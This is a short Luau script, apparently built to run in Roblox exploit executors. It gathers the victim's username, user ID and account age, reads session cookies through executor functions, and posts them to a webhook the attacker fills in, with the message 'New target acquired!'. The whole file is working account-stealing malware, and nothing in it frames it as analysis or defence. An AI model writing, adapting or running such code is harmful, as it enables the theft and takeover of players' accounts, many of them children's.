[A] ```luau
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local webhookUrl = "YOUR_WEBHOOK_URL_HERE"

local player = Players.LocalPlayer
local playerName = player.Name
local accountAge = player.AccountAge
local userId = player.UserId

local cookies = ""
pcall(function()
if syn and syn.get_cookies then
cookies = syn.get_cookies()
elseif getcookies then
cookies = getcookies()
end
end)

local data = {
["content"] = "@everyone New target acquired!",
["embeds"] = {{
["title"] = "Roblox Account Data",
["color"] = 16711680,
["fields"] = {
{["name"] = "Username", ["value"] = playerName, ["inline"] = true},
{["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
{["name"] = "Account Age", ["value"] = tostring(accountAge) .. " days", ["inline"] = true},
{["name"] = "Cookies/Data", ["value"] = "" .. tostring(cookies):sub(1, 1000) .. "", ["inline"] = false}
},
["footer"] = {["text"] = "Delivered by ANNIE"}
}}
}

local encodedData = HttpService:JSONEncode(data)

local requestMethod = syn and syn.request or http_request or request or HttpPost
if requestMethod then
pcall(function()
requestMethod({
Url = webhookUrl,
Method = "POST",
Headers = {["Content-Type"] = "application/json"},
Body = encodedData
})
end)
end
